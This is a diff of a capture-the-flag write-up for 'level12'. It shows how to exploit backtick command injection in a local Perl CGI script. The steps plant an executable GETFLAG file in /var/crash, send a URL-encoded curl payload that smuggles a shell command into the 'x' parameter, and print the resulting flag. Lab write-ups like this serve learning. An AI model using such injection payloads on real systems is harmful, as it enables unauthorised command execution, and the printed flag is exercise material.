@@ -14,9 +14,13 @@ We can use it this way : `curl localhost:4646/level12.pl/?x=text`
 we can abuse the backticks
  * Let's first create an uppercase file `GETFLAG` in `/var/crash/` whith execute rights
  ```sh
-echo "getflag > /var/crash/level12_output.txt" > GETFLAG
-chmod +x GETFLAG
+echo "getflag > /var/crash/level12_output.txt" > /var/crash/GETFLAG
+chmod +x /var/crash/GETFLAG
  ```
- * we want to execute: `curl localhost:4646/level12.pl?x=\`/\*/\*/getflag\``, but it needs to be encoded, we can use this site : https://meyerweb.com/eric/tools/dencoder/
+ * we want to execute: 
+ ```sh
+ curl localhost:4646/level12.pl?x=\`/\*/\*/getflag\` 
+ ```
+ but it needs to be encoded, we can use this site : https://meyerweb.com/eric/tools/dencoder/
  * which gives us: `curl localhost:4646/level12.pl?x=%60%2F*%2F*%2Fgetflag%60`
- * If we `cat level12_output.txt` we get the flag: `g1qKMiRpXf53AWhDaU7FEkczr`
+ * If we `cat /var/crash/level12_output.txt` we get the flag: `g1qKMiRpXf53AWhDaU7FEkczr`
